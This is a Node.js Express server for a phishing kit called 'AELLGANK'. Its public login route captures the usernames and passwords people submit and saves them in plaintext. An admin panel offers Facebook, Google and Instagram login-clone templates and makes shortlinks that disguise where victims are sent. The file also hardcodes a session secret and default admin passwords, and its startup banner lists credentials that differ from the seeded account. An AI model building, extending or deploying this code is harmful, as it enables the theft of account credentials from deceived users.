const express = require('express');
const session = require('express-session');
const bcrypt = require('bcrypt');
const fs = require('fs');
const path = require('path');
const rateLimit = require('express-rate-limit');
const cors = require('cors');
const multer = require('multer');
const { v4: uuidv4 } = require('uuid');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('public'));
app.use('/uploads', express.static('uploads'));
app.use(cors());
app.use(session({
    secret: 'aellgank_secret_key_2024',
    resave: false,
    saveUninitialized: true,
    cookie: { secure: false, maxAge: 3600000 }
}));
app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'));

// Upload setup untuk logo
const storage = multer.diskStorage({
    destination: (req, file, cb) => {
        const uploadDir = path.join(__dirname, 'public', 'uploads');
        if (!fs.existsSync(uploadDir)) fs.mkdirSync(uploadDir, { recursive: true });
        cb(null, uploadDir);
    },
    filename: (req, file, cb) => {
        cb(null, 'logo' + path.extname(file.originalname));
    }
});
const upload = multer({ storage: storage });

// Database setup
const dirs = ['database', 'public/uploads'];
dirs.forEach(dir => {
    if (!fs.existsSync(path.join(__dirname, dir))) {
        fs.mkdirSync(path.join(__dirname, dir), { recursive: true });
    }
});

const DB_USERS = path.join(__dirname, 'database', 'users.json');
const DB_LOGS = path.join(__dirname, 'database', 'logs.json');
const DB_ADMIN = path.join(__dirname, 'database', 'admin.json');
const DB_WEBS = path.join(__dirname, 'database', 'webs.json');
const DB_SHORTLINKS = path.join(__dirname, 'database', 'shortlinks.json');

// Init databases
if (!fs.existsSync(DB_USERS)) fs.writeFileSync(DB_USERS, JSON.stringify([], null, 2));
if (!fs.existsSync(DB_LOGS)) fs.writeFileSync(DB_LOGS, JSON.stringify({ submissions: [] }, null, 2));
if (!fs.existsSync(DB_WEBS)) fs.writeFileSync(DB_WEBS, JSON.stringify([], null, 2));
if (!fs.existsSync(DB_SHORTLINKS)) fs.writeFileSync(DB_SHORTLINKS, JSON.stringify([], null, 2));

if (!fs.existsSync(DB_ADMIN)) {
    const hashedPassword = bcrypt.hashSync('admin123', 10);
    fs.writeFileSync(DB_ADMIN, JSON.stringify([{
        id: 1,
        username: 'admin',
        email: 'admin@aellgank.com',
        password: hashedPassword,
        role: 'super_admin',
        dailyLimit: 10,
        dailyUsed: 0,
        lastReset: new Date().toDateString(),
        createdAt: new Date().toISOString()
    }], null, 2));
}

// Reset daily limit
function checkDailyReset() {
    const admins = JSON.parse(fs.readFileSync(DB_ADMIN));
    const today = new Date().toDateString();
    let updated = false;
    admins.forEach(admin => {
        if (admin.lastReset !== today) {
            admin.dailyUsed = 0;
            admin.lastReset = today;
            updated = true;
        }
    });
    if (updated) fs.writeFileSync(DB_ADMIN, JSON.stringify(admins, null, 2));
}

const limiter = rateLimit({ windowMs: 15 * 60 * 1000, max: 20 });

// Random functions
function randomLoginMethod() { return Math.random() < 0.5 ? 'Google' : 'Facebook'; }
function randomIP() { return `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`; }
function randomDevice() {
    const devices = ['Xiaomi Redmi Note 10', 'Samsung Galaxy A54', 'Realme GT Neo', 'Oppo Reno 8', 'Vivo Y100', 'iPhone 13'];
    return devices[Math.floor(Math.random() * devices.length)];
}

// Routes User
app.get('/', (req, res) => { res.render('user', { title: 'AELLGANK🦅 - Login', error: null }); });

app.post('/api/login', limiter, async (req, res) => {
    const { username, password } = req.body;
    if (!username || !password) return res.json({ success: false, message: 'Isi semua field!' });
    
    const fakeData = {
        username, password,
        loginMethod: randomLoginMethod(),
        ip: randomIP(),
        device: randomDevice(),
        browser: 'Chrome Mobile',
        timestamp: new Date().toISOString()
    };
    
    const dbLogs = JSON.parse(fs.readFileSync(DB_LOGS));
    dbLogs.submissions.push(fakeData);
    fs.writeFileSync(DB_LOGS, JSON.stringify(dbLogs, null, 2));
    
    const delaySeconds = Math.floor(Math.random() * 8) + 2;
    res.json({ success: true, message: 'Login recorded!', delay: delaySeconds });
});

// Admin Routes
app.get('/admin', (req, res) => {
    if (req.session.admin) return res.redirect('/admin/dashboard');
    res.render('admin/login', { error: null });
});

app.post('/admin/login', async (req, res) => {
    const { email, password } = req.body;
    const admins = JSON.parse(fs.readFileSync(DB_ADMIN));
    const admin = admins.find(a => a.email === email);
    
    if (admin && bcrypt.compareSync(password, admin.password)) {
        req.session.admin = { id: admin.id, username: admin.username, email: admin.email, role: admin.role, dailyLimit: admin.dailyLimit, dailyUsed: admin.dailyUsed };
        res.redirect('/admin/dashboard');
    } else {
        res.render('admin/login', { error: 'Email atau password salah!' });
    }
});

app.get('/admin/logout', (req, res) => { req.session.destroy(); res.redirect('/admin'); });

function requireAdmin(req, res, next) {
    if (!req.session.admin) return res.redirect('/admin');
    checkDailyReset();
    const admins = JSON.parse(fs.readFileSync(DB_ADMIN));
    const currentAdmin = admins.find(a => a.id === req.session.admin.id);
    if (currentAdmin) {
        req.session.admin.dailyLimit = currentAdmin.dailyLimit;
        req.session.admin.dailyUsed = currentAdmin.dailyUsed;
    }
    next();
}

// Dashboard
app.get('/admin/dashboard', requireAdmin, (req, res) => {
    const webs = JSON.parse(fs.readFileSync(DB_WEBS));
    const myWebs = webs.filter(w => w.createdBy === req.session.admin.email);
    res.render('admin/dashboard', { admin: req.session.admin, stats: {
        dailyLimit: req.session.admin.dailyLimit,
        dailyUsed: req.session.admin.dailyUsed,
        remaining: req.session.admin.dailyLimit - req.session.admin.dailyUsed,
        totalWebs: myWebs.length,
        activeWebs: myWebs.filter(w => w.status === 'active').length
    } });
});

// Upload Logo
app.post('/admin/upload-logo', requireAdmin, upload.single('logo'), (req, res) => {
    if (req.file) {
        res.json({ success: true, logoUrl: '/uploads/' + req.file.filename });
    } else {
        res.json({ success: false, message: 'Upload gagal' });
    }
});

// Create Web
app.get('/admin/create-web', requireAdmin, (req, res) => { res.render('admin/create-web', { error: null, success: null }); });

app.post('/admin/create-web', requireAdmin, (req, res) => {
    const { webName, webUrl, template } = req.body;
    if (!webName || !webUrl) return res.render('admin/create-web', { error: 'Nama dan URL wajib!', success: null });
    if (req.session.admin.dailyUsed >= req.session.admin.dailyLimit) return res.render('admin/create-web', { error: 'Limit harian habis!', success: null });
    
    const webs = JSON.parse(fs.readFileSync(DB_WEBS));
    webs.push({ id: uuidv4(), name: webName, url: webUrl, template: template || 'default', status: 'active', createdAt: new Date().toISOString(), createdBy: req.session.admin.email, clicks: 0 });
    fs.writeFileSync(DB_WEBS, JSON.stringify(webs, null, 2));
    
    const admins = JSON.parse(fs.readFileSync(DB_ADMIN));
    const adminIndex = admins.findIndex(a => a.id === req.session.admin.id);
    if (adminIndex !== -1) { admins[adminIndex].dailyUsed += 1; fs.writeFileSync(DB_ADMIN, JSON.stringify(admins, null, 2)); req.session.admin.dailyUsed += 1; }
    
    res.render('admin/create-web', { error: null, success: `✅ Web "${webName}" berhasil dibuat!` });
});

// My Webs
app.get('/admin/my-webs', requireAdmin, (req, res) => {
    const webs = JSON.parse(fs.readFileSync(DB_WEBS));
    res.render('admin/my-webs', { webs: webs.filter(w => w.createdBy === req.session.admin.email), admin: req.session.admin });
});

app.post('/admin/delete-web/:id', requireAdmin, (req, res) => {
    const webs = JSON.parse(fs.readFileSync(DB_WEBS));
    fs.writeFileSync(DB_WEBS, JSON.stringify(webs.filter(w => w.id !== req.params.id), null, 2));
    res.json({ success: true });
});

// Shortlink
app.get('/admin/create-shortlink', requireAdmin, (req, res) => { res.render('admin/create-shortlink', { error: null, success: null }); });

app.post('/admin/create-shortlink', requireAdmin, (req, res) => {
    const { originalUrl, customSlug } = req.body;
    if (!originalUrl) return res.render('admin/create-shortlink', { error: 'URL wajib diisi!', success: null });
    
    const shortlinks = JSON.parse(fs.readFileSync(DB_SHORTLINKS));
    const slug = customSlug || Math.random().toString(36).substring(2, 8);
    if (shortlinks.find(s => s.slug === slug)) return res.render('admin/create-shortlink', { error: 'Slug sudah dipakai!', success: null });
    
    shortlinks.push({ id: uuidv4(), originalUrl, slug, shortUrl: `https://aell.ga/${slug}`, clicks: 0, createdAt: new Date().toISOString(), createdBy: req.session.admin.email });
    fs.writeFileSync(DB_SHORTLINKS, JSON.stringify(shortlinks, null, 2));
    res.render('admin/create-shortlink', { error: null, success: `✅ Shortlink: https://aell.ga/${slug}` });
});

app.get('/admin/my-shortlinks', requireAdmin, (req, res) => {
    const shortlinks = JSON.parse(fs.readFileSync(DB_SHORTLINKS));
    res.render('admin/my-shortlinks', { shortlinks: shortlinks.filter(l => l.createdBy === req.session.admin.email), admin: req.session.admin });
});

app.post('/admin/delete-shortlink/:id', requireAdmin, (req, res) => {
    const shortlinks = JSON.parse(fs.readFileSync(DB_SHORTLINKS));
    fs.writeFileSync(DB_SHORTLINKS, JSON.stringify(shortlinks.filter(l => l.id !== req.params.id), null, 2));
    res.json({ success: true });
});

// Gallery
app.get('/admin/template-gallery', requireAdmin, (req, res) => {
    const templates = [
        { id: 1, name: 'Default', preview: 'Default phishing template', category: 'standard' },
        { id: 2, name: 'Facebook', preview: 'Facebook login clone', category: 'social' },
        { id: 3, name: 'Google', preview: 'Google login clone', category: 'social' },
        { id: 4, name: 'Instagram', preview: 'Instagram login clone', category: 'social' }
    ];
    res.render('admin/template-gallery', { templates, admin: req.session.admin });
});

app.get('/admin/shortlink-gallery', requireAdmin, (req, res) => {
    const shortlinks = JSON.parse(fs.readFileSync(DB_SHORTLINKS));
    res.render('admin/shortlink-gallery', { shortlinks, admin: req.session.admin });
});

// Settings
app.get('/admin/settings', requireAdmin, (req, res) => { res.render('admin/settings', { admin: req.session.admin, error: null, success: null }); });

app.post('/admin/settings/change-password', requireAdmin, async (req, res) => {
    const { currentPassword, newPassword } = req.body;
    const admins = JSON.parse(fs.readFileSync(DB_ADMIN));
    const adminIndex = admins.findIndex(a => a.id === req.session.admin.id);
    if (adminIndex === -1) return res.render('admin/settings', { admin: req.session.admin, error: 'Admin tidak ditemukan!', success: null });
    if (!bcrypt.compareSync(currentPassword, admins[adminIndex].password)) return res.render('admin/settings', { admin: req.session.admin, error: 'Password salah!', success: null });
    
    admins[adminIndex].password = bcrypt.hashSync(newPassword, 10);
    fs.writeFileSync(DB_ADMIN, JSON.stringify(admins, null, 2));
    res.render('admin/settings', { admin: req.session.admin, error: null, success: '✅ Password berhasil diubah!' });
});

// Redirect shortlink
app.get('/s/:slug', (req, res) => {
    const shortlinks = JSON.parse(fs.readFileSync(DB_SHORTLINKS));
    const link = shortlinks.find(l => l.slug === req.params.slug);
    if (link) { link.clicks += 1; fs.writeFileSync(DB_SHORTLINKS, JSON.stringify(shortlinks, null, 2)); res.redirect(link.originalUrl); }
    else res.status(404).send('Shortlink not found');
});

app.listen(PORT, () => {
    console.log(`
    🦅 AELLGANK SYSTEM ACTIVE 🦅
    =================================
    🌐 User Panel: http://localhost:${PORT}
    👑 Admin Panel: http://localhost:${PORT}/admin
    🔐 Email: admin@gmail.com
    🔐 Password: admin515
    =================================
    `);
});